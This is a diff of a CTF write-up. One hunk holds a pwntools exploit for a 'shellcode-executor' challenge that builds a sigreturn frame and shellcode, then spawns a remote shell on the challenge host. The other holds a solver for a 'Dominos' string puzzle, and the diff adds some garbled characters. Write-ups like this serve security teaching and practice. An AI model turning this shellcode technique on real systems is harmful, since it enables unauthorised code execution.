@@ -113,51 +113,51 @@ p.interactive()
 ![image](https://user-images.githubusercontent.com/25066959/71326431-cbd4c700-24c8-11ea-99b7-bbf78277608e.png)    
 ```python
 #!/usr/bin/env python2
-?
+
 from pwn import *
-?
+
 context(arch = 'amd64')
-?
+
 # p = process("./shellcodeexecutor")
 p = remote("shellcode-executor.nc.jctf.pro", 1337)
-?
+
 # Delete shellcode
 p.sendlineafter("> ", "2")
-?
+
 # Overwrite chunks
 p.sendlineafter(">", "1")
-?
+
 frame = SigreturnFrame(kernel='amd64')
 frame.rip = 0x1337
 frame.rsp = 0x1338
-?
+
 shellcode = ""
 shellcode += asm("push 0x3337")
 for f in unpack_many(str(frame))[::-1]:
-?
+
     if f == 0x1337:
         shellcode += asm("add rdx, 0x200; push rdx")
     elif f == 0x1338:
         shellcode += asm("push rsp")
     else:
         shellcode += asm("push {}".format(f))
-?
+
 shellcode += asm("""
     mov rax, 231
     syscall
 """)
-?
+
 shellcode = shellcode.ljust(0x200, "\x90")
 shellcode += asm(shellcraft.amd64.sh())
 ?
 print hexdump(shellcode)
-?
+
 p.sendlineafter("Enter url: ", shellcode)
-?
+
 pause()
-?
+
 p.sendlineafter("> ", "3")
-?
+
 p.interactive()
 ```    
 the challenge gives the impression that we have to do an alphanumeric shellcode, but we can bypass it and put the shellcode we want    
@@ -215,89 +215,98 @@ show(points([(c.real,c.imag) for c in r], color='darkgreen', pointsize=5), aspec
 
 ## Dominos 
 ![image](https://user-images.githubusercontent.com/25066959/71326594-f758b100-24ca-11ea-9dd6-11ffc45064ca.png)   
-(index array) 75 76 19 82 make _so lve d_t he_so it’s just split into three character slices and in a random order?    
+(index array) 75 76 19 82 make _so lve d_t he_so itâ€™s just split into three character slices and in a random order?    
 lets use a script...
+wordlist.txt is a english dictionary and puzzles.txt is the challenge code
+puzzles.txt:    
+```
+_so
+d_t
+he_sp
+mak_w
+...
+```
 solution:
 ```python3
 #!/usr/bin/env python3
-?
+
 from itertools import product
-?
+
 def merge(parts):
     ret = ''
     for part in parts[:-1]:
         ret += part[:-2]
-?
+
     return ret + parts[-1]
-?
+
 words = open("./words.txt").readlines()
 words = list(map(str.strip, words))
-?
+
 puzzles = open("./puzzles.txt").readlines()
 puzzles = list(map(str.strip, puzzles))
 puzzles = sorted(puzzles)
-?
-?
+
+
 used = []
 flag_done = False
 while True:
-?
+
     single_match_found = False
-?
+
     matches = {}
     for i, puzzle in enumerate(puzzles):
         last_letters = puzzle[-2:]
-?
+
         if i in used:
             continue
-?
+
         for j, puzzle_2 in enumerate(puzzles):
             first_letters = puzzle_2[:2]
-?
+
             if j in used:
                 continue
-?
+
             if last_letters == first_letters:
                 current_matches = matches.get(i, [])
                 current_matches.append(j)
                 matches[i] = current_matches
-?
+
     for k in matches:
-?
+
         possible_words = set([puzzles[i] for i in matches[k]])
-?
+
         if len(possible_words) == 1:
-?
+
             single_match_found = True
-?
+
             matched_index = matches[k][0]
             used.append(k)
             used.append(matched_index)
-?
+
             new_word = merge([puzzles[k], puzzles[matched_index]])
             puzzles.append(new_word)
             break
-?
+
         if len(matches[k]) == 0:
             flag = puzzles[k]
             flag_done = True
             break
-?
-?
+
+
     if not single_match_found and not flag_done:
-?
+
         print("Manual round!")
-?
+
         for k in matches:
-?
+
             possible_words = set([puzzles[i] for i in matches[k]])
-?
+
             if len(possible_words) >= 2:
                 print("Choose one for {} ('\\n' to go to next | 's' to skip): ".format(puzzles[k]))
-?
+
                 for match in matches[k]:
                     print('[{}] - {}'.format(match, puzzles[match]))
-?
+
                 choice = raw_input("> ").strip()
                 if choice != '' and choice != 's':
                     single_match_found = True
@@ -307,15 +316,15 @@ while True:
                     new_word = merge([puzzles[k], puzzles[matched_index]])
                     puzzles.append(new_word)
                     break
-?
+
                 if choice == 's':
                     break
-?
+
         if len(matches[k]) == 0:
             flag = puzzles[k]
             flag_done = True
             break
-?
+
     print(puzzles)
 ```
 
